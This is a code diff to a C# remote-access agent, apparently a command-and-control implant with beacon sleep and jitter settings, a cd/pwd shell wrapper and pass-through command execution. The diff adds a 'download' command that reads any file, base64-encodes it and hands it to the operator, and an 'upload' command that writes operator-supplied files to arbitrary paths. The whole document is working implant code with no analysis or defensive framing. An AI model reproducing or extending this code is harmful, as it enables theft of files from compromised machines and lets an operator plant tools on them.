@@ -1,7 +1,4 @@
-using System;
 using System.Diagnostics;
-using System.IO;
-using System.Net.Http;
 using System.Text;
 using System.Text.Json;
 using System.Net.NetworkInformation;
@@ -81,17 +78,15 @@ class Agent
     {
         string trimmed = command.Trim();
 
-        if (trimmed == "cd" || trimmed.StartsWith("cd "))
-        {
+        if (trimmed == "cd" || trimmed.StartsWith("cd ")){
             return BuiltinCd(trimmed);
         }
 
-        if (trimmed == "pwd")
-        {
+        if (trimmed == "pwd"){
             return currentDir;
         }
-        if (trimmed == "sleep" || trimmed.StartsWith("sleep "))
-        {
+
+        if (trimmed == "sleep" || trimmed.StartsWith("sleep ")){
             string[] parts = trimmed.Split(' ');
 
             if (parts.Length < 2)
@@ -110,6 +105,61 @@ class Agent
             return $"Sleep alterado: base={BEACON_BASE}s, jitter=±{BEACON_JITTER}% - próximo delay entre {BEACON_BASE - BEACON_BASE * BEACON_JITTER / 100}s e {BEACON_BASE + BEACON_BASE * BEACON_JITTER / 100}s";
         }
 
+        if (trimmed == "download" || trimmed.StartsWith("download ")){
+            string[] parts = trimmed.Split(' ', 2);
+            if (parts.Length < 2)
+                return "Uso: download caminho/do/arquivo";
+
+            //resolve o caminho relativo baseado no currentDir
+
+            string resolvedPath = Path.GetFullPath(parts[1], currentDir);
+            if (!File.Exists(resolvedPath))
+                return $"Arquivo não encontrado: {resolvedPath}";
+
+            try{
+                byte[] fileBytes = File.ReadAllBytes(resolvedPath);
+                string base64Content = Convert.ToBase64String(fileBytes);
+                string name = Path.GetFileName(resolvedPath);
+                return $"b64:{name}:{base64Content}";
+            }
+            catch (Exception ex){
+                return $"Erro ao ler arquivo: {ex.Message}";
+            }
+        }
+
+        if (trimmed == "upload" || trimmed.StartsWith("upload ")){
+            string[] parts = trimmed.Split(' ', 2);
+            if (parts.Length < 2)
+                return "Uso: upload caminho/de/destino";
+
+            if (string.IsNullOrEmpty(stdin))
+                return "Erro: nenhum conteúdo recebido (stdin vazio)";
+
+            string originalName = "upload";
+            string b64 = stdin;
+
+            int separatorIdx = stdin.IndexOf(':');
+            if (separatorIdx > 0 && separatorIdx < 260)
+            {
+                originalName = stdin.Substring(0, separatorIdx);
+                b64 = stdin.Substring(separatorIdx + 1);
+            }
+
+            string resolvedDestPath = Path.GetFullPath(parts[1], currentDir);
+
+            if (Directory.Exists(resolvedDestPath))
+                resolvedDestPath = Path.Combine(resolvedDestPath, originalName);
+
+            try{
+                byte[] bytes = Convert.FromBase64String(b64);
+                File.WriteAllBytes(resolvedDestPath, bytes);
+
+                return $"Arquivo salvo: {resolvedDestPath} ({bytes.Length} bytes)";
+            }
+            catch (Exception ex){
+                return $"Erro no upload do arquivo: {ex.Message}";
+            }
+        }
         return ExecuteCommand(trimmed, stdin, shell);
     }
 
